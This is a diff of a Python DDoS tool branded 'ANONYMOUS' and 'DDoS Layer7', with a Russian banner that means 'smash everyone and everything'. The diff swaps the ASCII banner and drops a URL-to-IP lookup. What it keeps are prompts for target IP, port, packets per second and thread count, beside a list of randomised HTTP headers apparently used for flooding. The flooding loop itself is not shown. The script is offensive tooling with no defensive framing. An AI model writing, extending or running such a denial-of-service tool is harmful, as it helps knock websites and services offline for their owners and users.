@@ -21,17 +21,17 @@ pink='\033[95m'
 red='\033[91m'
 b='\033[1m'
 ##############
-
 os.system("clear")
+
 print("""\033[93m
-             __      ANONYMOUS       _____
-            / /  __ _ _   _  ___ _  |___  |
-           / /  / _` | | | |/ _ \ '__| / /
-          / /__| (_| | |_| |  __/ |   / /
-          \____/\__,_|\__, |\___|_|  /_/
-                      |___/
-                 ADDED NEW METHOD 
-               DDoS Layer7 (DDoS) 💥
+               ANONYMOUS
+      ╭━━━╮     ╭╮ ╭━━━╮
+      ┃╭━━╯     ┃┃ ╰╮╭╮┃
+      ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
+      ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
+      ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
+      ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
+          Разнеси всех и вся 💥
 """)
 print ()
 time.sleep(2)
@@ -63,13 +63,8 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-#ip
-url = input(" \033[94m[+] Url target \033[1;31;40m  ==> : \033[0m")
-url_chek = requests.get(url)
-ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
-print()
-print(ip)
-ip = str(input(" \033[94m[+] IP target \033[1;31;40m  ==> : \033[0m"))
+print ()
+ip = str(input(" \033[94m[+] IP Target \033[1;31;40m  ==> : \033[0m"))
 port = int(input(" \033[94m[+] Port Target \033[1;31;40m ==> : \033[0m"))
 pack = int(input(" \033[94m[+] INPUT PACKET/s \033[1;31;40m  ==> : \033[0m"))
 threads = int(input(" \033[94m[+] INPUT THREADS \033[1;31;40m  ==> : \033[0m"))
